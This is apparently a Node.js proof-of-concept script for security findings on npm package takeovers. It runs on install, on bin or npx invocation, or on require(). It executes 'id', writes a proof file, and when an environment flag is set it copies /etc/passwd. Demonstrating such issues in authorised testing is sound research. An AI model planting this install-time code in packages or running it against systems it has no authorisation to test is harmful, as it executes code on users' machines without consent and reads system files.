#!/usr/bin/env node
// RCE proof for npm takeover findings (educational use only).
// Executes on ALL of these surfaces (npm 12 blocks only the first):
//   preinstall (legacy/allowlisted clients) | bin invocation | npx | require()
// Default payload is harmless: writes proof to rce-proof.txt (user/cwd/time + id).
// Set POC_IMPACT=1 (authorized targets only) to also demonstrate data
// access by copying /etc/passwd as the impact demonstration.
const fs = require('fs');
const os = require('os');
const { execSync } = require('child_process');

const proof = `[PoC] preinstall executed as ${os.userInfo().username} in ${process.cwd()} at ${new Date().toISOString()}\nid: ${execSync('id').toString()}\n`;
fs.writeFileSync('rce-proof.txt', proof);
console.log(proof);

if (process.env.POC_IMPACT === '1') {
  fs.copyFileSync('/etc/passwd', 'etc_passwd.txt');
  console.log('[PoC] impact demo: /etc/passwd copied to etc_passwd.txt (POC_IMPACT=1)');
}
